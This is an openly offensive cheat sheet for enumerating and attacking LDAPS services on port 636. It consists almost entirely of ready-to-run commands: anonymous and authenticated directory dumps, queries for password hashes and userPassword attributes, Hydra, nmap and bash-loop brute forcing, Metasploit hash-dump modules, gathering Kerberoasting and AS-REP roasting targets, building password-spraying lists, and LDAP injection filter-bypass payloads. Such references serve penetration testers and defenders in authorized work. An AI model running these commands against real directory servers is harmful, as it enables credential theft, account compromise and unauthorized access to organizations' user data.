# LDAPS ENUMERATION (Port 636)

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p636 <IP>                              # Service/Version detection
openssl s_client -connect <IP>:636               # Connect with SSL/TLS
nc -nv <IP> 636                                  # Manual banner (won't work without TLS)

# Connect and query
openssl s_client -connect <IP>:636
```

## SSL/TLS CERTIFICATE ENUMERATION
```bash
# Get certificate details
openssl s_client -connect <IP>:636 2>/dev/null | openssl x509 -noout -text
openssl s_client -connect <IP>:636 -showcerts 2>/dev/null

# Certificate subject/issuer
openssl s_client -connect <IP>:636 2>/dev/null | openssl x509 -noout -subject
openssl s_client -connect <IP>:636 2>/dev/null | openssl x509 -noout -issuer

# Check certificate SANs (may reveal domain names)
openssl s_client -connect <IP>:636 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
nmap -p636 --script ssl-cert <IP>
```

## SSL/TLS SECURITY TESTING
```bash
# Cipher suite enumeration
nmap --script ssl-enum-ciphers -p636 <IP>
sslscan <IP>:636
sslyze --regular <IP>:636

# SSL/TLS version testing
openssl s_client -ssl3 -connect <IP>:636         # SSLv3
openssl s_client -tls1 -connect <IP>:636         # TLS 1.0
openssl s_client -tls1_2 -connect <IP>:636       # TLS 1.2
openssl s_client -tls1_3 -connect <IP>:636       # TLS 1.3

# Comprehensive testing
testssl.sh <IP>:636
testssl.sh --vulnerable <IP>:636
```

## LDAP QUERIES (Anonymous Bind)
```bash
# Test anonymous bind (LDAPS)
ldapsearch -H ldaps://<IP>:636 -x -s base -b "" namingContexts
ldapsearch -H ldaps://<IP>:636 -x -s base -b "" "*" +
ldapsearch -H ldaps://<IP>:636 -x -b "dc=domain,dc=com" "*"

# Get naming contexts (base DNs)
ldapsearch -H ldaps://<IP>:636 -x -s base namingContexts

# Dump entire directory
ldapsearch -H ldaps://<IP>:636 -x -b "dc=domain,dc=com" > ldap_dump.txt

# Search for users
ldapsearch -H ldaps://<IP>:636 -x -b "dc=domain,dc=com" "(objectClass=user)"
ldapsearch -H ldaps://<IP>:636 -x -b "dc=domain,dc=com" "(objectClass=person)"

# Search for groups
ldapsearch -H ldaps://<IP>:636 -x -b "dc=domain,dc=com" "(objectClass=group)"

# Search for computers
ldapsearch -H ldaps://<IP>:636 -x -b "dc=domain,dc=com" "(objectClass=computer)"
```

## AUTHENTICATED LDAP QUERIES
```bash
# Bind with credentials
ldapsearch -H ldaps://<IP>:636 -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com"

# Get all users with details
ldapsearch -H ldaps://<IP>:636 -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName mail memberOf

# Get admin users
ldapsearch -H ldaps://<IP>:636 -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com" "(adminCount=1)"

# Get users with passwords
ldapsearch -H ldaps://<IP>:636 -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com" "(objectClass=user)" userPassword

# Get service accounts
ldapsearch -H ldaps://<IP>:636 -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com" "(servicePrincipalName=*)"

# Get password policy
ldapsearch -H ldaps://<IP>:636 -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com" "(objectClass=pwdPolicy)"
```

## LDAP ENUMERATION WITH LDAPDOMAINDUMP
```bash
# Dump all LDAP information (requires credentials)
ldapdomaindump -u 'domain\user' -p password ldaps://<IP>:636
ldapdomaindump -u 'domain\user' -p password ldaps://<IP>:636 -o ldap_output/

# Output includes:
# - domain_users.html
# - domain_groups.html
# - domain_computers.html
# - domain_policy.html
# - domain_trusts.html
```

## WINDAPSEARCH TOOL
```bash
# Enumerate users
windapsearch -d <domain> --dc-ip <IP> -u user -p password --users -s

# Enumerate groups
windapsearch -d <domain> --dc-ip <IP> -u user -p password --groups

# Enumerate computers
windapsearch -d <domain> --dc-ip <IP> -u user -p password --computers

# Enumerate privileged users
windapsearch -d <domain> --dc-ip <IP> -u user -p password --privileged-users

# Custom LDAP query
windapsearch -d <domain> --dc-ip <IP> -u user -p password --custom "(objectClass=*)"
```

## NMAP LDAP SCRIPTS
```bash
# LDAP enumeration
nmap -p636 --script ldap-rootdse <IP>            # Get root DSE
nmap -p636 --script ldap-search --script-args ldap.username='cn=admin,dc=domain,dc=com',ldap.password='password' <IP>
nmap -p636 --script ldap-brute <IP>              # Brute force

# SSL/TLS scripts
nmap -p636 --script "ldap-* and ssl-*" <IP>
```

## BRUTE FORCE ATTACKS
```bash
# Hydra (LDAPS)
hydra -L users.txt -P passwords.txt ldap3://<IP>:636
hydra -l "cn=admin,dc=domain,dc=com" -P passwords.txt ldap3://<IP>:636

# Nmap brute force
nmap -p636 --script ldap-brute --script-args ldap.base='"cn=users,dc=domain,dc=com"' <IP>

# Custom script for LDAP brute force
for pass in $(cat passwords.txt); do
    ldapsearch -H ldaps://<IP>:636 -D "cn=admin,dc=domain,dc=com" -w "$pass" -b "" -s base && echo "[+] Password: $pass" && break
done
```

## EXTRACT SENSITIVE INFORMATION
```bash
# Get password hashes (if accessible)
ldapsearch -H ldaps://<IP>:636 -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com" "(objectClass=user)" userPassword sambaNTPassword

# Get email addresses
ldapsearch -H ldaps://<IP>:636 -x -b "dc=domain,dc=com" "(objectClass=user)" mail | grep mail:

# Get phone numbers
ldapsearch -H ldaps://<IP>:636 -x -b "dc=domain,dc=com" telephoneNumber

# Get description fields (often contain passwords!)
ldapsearch -H ldaps://<IP>:636 -x -b "dc=domain,dc=com" "(objectClass=user)" description | grep description:

# Get all attributes for specific user
ldapsearch -H ldaps://<IP>:636 -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com" "(sAMAccountName=username)" "*" +
```

## COMMON LDAP ATTRIBUTES
```bash
# User attributes
cn                                               # Common name
sAMAccountName                                   # Windows username
userPrincipalName                                # User principal name
mail                                             # Email address
memberOf                                         # Group membership
userAccountControl                               # Account flags
pwdLastSet                                       # Password last set
lastLogon                                        # Last logon timestamp
description                                      # Description (check for passwords!)
info                                             # Info field

# Computer attributes
dNSHostName                                      # DNS hostname
operatingSystem                                  # OS version
operatingSystemVersion                           # OS version number

# Group attributes
member                                           # Group members
distinguishedName                                # Distinguished name
```

## ACTIVE DIRECTORY ENUMERATION
```bash
# Get domain info
ldapsearch -H ldaps://<IP>:636 -x -s base -b "" defaultNamingContext

# Get domain password policy
ldapsearch -H ldaps://<IP>:636 -x -b "dc=domain,dc=com" "(objectClass=domainDNS)" pwdProperties pwdHistoryLength minPwdLength maxPwdAge minPwdAge

# Get domain trusts
ldapsearch -H ldaps://<IP>:636 -x -b "cn=System,dc=domain,dc=com" "(objectClass=trustedDomain)"

# Get SPNs (Service Principal Names)
ldapsearch -H ldaps://<IP>:636 -x -b "dc=domain,dc=com" "(&(objectClass=user)(servicePrincipalName=*))" servicePrincipalName

# Get delegation rights
ldapsearch -H ldaps://<IP>:636 -x -b "dc=domain,dc=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
```

## VULNERABILITY SCANNING
```bash
# SSL/TLS vulnerabilities
nmap -p636 --script ssl-heartbleed <IP>
nmap -p636 --script ssl-poodle <IP>
nmap -p636 --script ssl-drown <IP>
testssl.sh --vulnerable <IP>:636

# LDAP-specific vulnerabilities
searchsploit ldap
nmap -p636 --script vuln <IP>
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/gather/ldap_query                  # LDAP query
use auxiliary/scanner/ldap/ldap_login            # LDAP brute force
use auxiliary/gather/ldap_hashdump               # Dump hashes
set RPORT 636
set SSL true
```

## COMMON MISCONFIGURATIONS
```
☐ Anonymous bind allowed                        # No authentication required
☐ Weak SSL/TLS configuration                     # SSLv3, TLS 1.0, weak ciphers
☐ Self-signed certificate                       # Dev/test environment
☐ Default credentials                            # admin:admin, etc.
☐ Passwords in description fields                # Common misconfiguration
☐ Excessive permissions                          # Users can read sensitive data
☐ No account lockout policy                     # Brute force possible
☐ LDAP injection vulnerable                      # Input validation issues
☐ Certificate name mismatch                      # Configuration error
☐ Verbose error messages                         # Information leakage
```

## QUICK WIN CHECKLIST
```
☐ Test anonymous bind
☐ Extract base DN and naming contexts
☐ Enumerate users, groups, computers
☐ Check for passwords in description fields
☐ Check SSL/TLS configuration
☐ Test for Heartbleed (OpenSSL < 1.0.1g)
☐ Extract certificate SANs for domain info
☐ Test default credentials
☐ Brute force with common passwords
☐ Look for service accounts (SPNs)
☐ Check for domain admin accounts
☐ Extract password policy
☐ Search for known LDAP vulnerabilities
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive LDAPS scan
nmap -sV -p636 --script "ldap-* and ssl-*" -oA ldaps_enum <IP>

# Quick anonymous bind test
ldapsearch -H ldaps://<IP>:636 -x -s base -b "" namingContexts

# Dump all users (if anonymous bind works)
ldapsearch -H ldaps://<IP>:636 -x -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName mail description
```

## POST-EXPLOITATION (After access)
```bash
# Extract all users for password spraying
ldapsearch -H ldaps://<IP>:636 -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName | grep sAMAccountName | awk '{print $2}' > users.txt

# Find admin users
ldapsearch -H ldaps://<IP>:636 -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com" "(adminCount=1)" sAMAccountName

# Kerberoasting targets
ldapsearch -H ldaps://<IP>:636 -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# AS-REP roasting targets (users without Kerberos pre-auth)
ldapsearch -H ldaps://<IP>:636 -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

## LDAP INJECTION TESTING
```bash
# Test for LDAP injection in login forms
# Username: admin)(&
# Password: anything

# LDAP filter bypass
*
admin*
admin)(objectClass=*)
*)(uid=*))(|(uid=*
```

## ADVANCED TECHNIQUES
```bash
# Certificate transparency logs
curl -s "https://crt.sh/?q=%.<domain>&output=json" | jq -r '.[].name_value' | grep ldap | sort -u

# Check for certificate issues
openssl s_client -connect <IP>:636 2>/dev/null | openssl x509 -noout -dates

# OCSP stapling
openssl s_client -connect <IP>:636 -status 2>/dev/null | grep -A17 "OCSP"

# Session resumption
openssl s_client -connect <IP>:636 -reconnect 2>/dev/null | grep "Session-ID"
```
